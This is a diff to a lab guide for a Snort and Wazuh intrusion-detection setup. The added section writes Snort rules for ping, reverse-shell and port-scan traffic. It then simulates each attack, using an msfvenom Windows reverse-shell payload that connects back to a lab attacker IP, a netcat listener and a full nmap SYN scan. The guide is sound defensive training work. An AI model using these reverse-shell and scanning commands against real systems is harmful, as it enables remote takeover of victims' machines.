@@ -1,5 +1,5 @@
 
-![alt text](image-25.png)
+![alt text](image-26.png)
 
 ## Information about machines in the model
 
@@ -228,8 +228,6 @@ sudo ip route add default via 172.16.5.1 dev eth1
 This command adds a default route, telling the system to send all traffic destined outside the local network through the gateway `172.16.5.1` on interface `eth1`.
 
 
-
-
 ## 3. Configuring NAT outbound for Router
 
 ```bash
@@ -423,4 +421,65 @@ New-NetFirewallRule -DisplayName "Allow ICMPv4-In" -Protocol ICMPv4 -IcmpType 8 
 
 - Check log in Wazuh-Server
 ![alt text](image-24.png)
+
+##
+
+### Ping attack
+rule Snort:
+```bash
+alert icmp any any -> any any (msg:"ICMP Ping Detected"; itype:8; dsize:0; sid:1000001; rev:1;)
 ```
+
+check log in Wazuh-Server:
+![alt text](image-2.png)
+
+### Reverse shell attack
+
+In Snort, we will create a rule to detect reverse shell attacks. The rule will look for specific patterns in the traffic that indicate a reverse shell connection.
+```bash
+alert tcp any any -> any any (msg:"Netcat reverse shell"; content:"/bin/sh"; sid:100001; rev:1;)
+
+alert tcp any any -> any any (msg:"Possible Reverse Shell - Windows CMD Banner"; content:"Microsoft Windows"; sid:1001001; rev:1;)
+```
+
+To simulate a reverse shell attack, we will use `msfvenom` to create a payload that will connect back to the Attacker machine. The steps are as follows:
+
+1. Create a reverse shell payload using msfvenom:
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.81.1.128 LPORT=4444 -f exe -o reverse_shell.exe
+```
+2. Transfer the payload to the Victim machine using a file transfer method (e.g., SCP, FTP, or a web server).
+
+3. In attacker machine, start a listener 
+```bash
+nc -lvnp 4444
+```
+
+4. Execute the payload on the Victim machine:
+```bash
+.\reverse_shell.exe
+```
+
+Check the connection in the Attacker machine:
+![alt text](image-7.png)
+
+Check the log in Wazuh-Server:
+![alt text](image-25.png)
+
+### Port scanning attack
+In Snort, we will create a rule to detect port scanning attacks. The rule will look for patterns in the traffic that indicate a port scan.
+
+```bash
+alert tcp any any -> any any (msg:"Port Scan Detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 1; sid:100002; rev:1;)
+```
+To simulate a port scanning attack, we will use `nmap` to scan the Victim machine for open ports. The steps are as follows:
+1. In the Attacker machine, run the following command to scan the Victim machine:
+```bash
+nmap -sS -p- 172.16.5.200
+```
+2. Check the log in Wazuh-Server:
+![alt text](image-27.png)
+
+
+
+
